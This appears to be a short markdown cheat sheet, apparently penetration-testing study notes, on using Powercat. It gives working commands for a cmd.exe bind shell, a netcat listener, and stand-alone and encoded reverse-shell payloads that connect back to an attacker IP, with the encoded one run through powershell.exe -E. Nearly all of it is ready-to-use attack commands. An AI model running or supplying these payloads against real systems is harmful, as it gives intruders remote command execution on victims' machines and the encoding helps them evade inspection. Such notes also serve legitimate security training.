# Powercat

## Powercat Bind Shells

```
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443
```

## Powercat Stand-Alone Payloads

In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user

first we launch a netcat listener in attacker machine:

```
nc -nvlp 4444
```

​​we create a stand-alone reverse shell payload by adding the -g option to the previous powercat command and redirecting the output to a file. This will produce a powershell script that attacker can execute on his machine

```
powercat -c 10.11.0.4 -p 4444 -e cmd.exe -g > reverseshell.ps1
./reverseshell.ps1
```

To generate a stand-alone encoded payload, we use the -ge option and once again redirect the output to a file:

```
powercat -c 10.11.0.4 -p 4444 -e cmd.exe -ge > encrypted-reverseshell.ps1
```

The file will contain an encoded string that can be executed using the PowerShell -E (EncodedCommand) option. However, since the -E option was designed as a way to submit complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be executed in the same way as our unencoded payload. Instead, Bob needs to pass the whole encoded string to powershell.exe -E so we copy the whole file and paste it in the console:

```
powershell.exe -E [code]
```
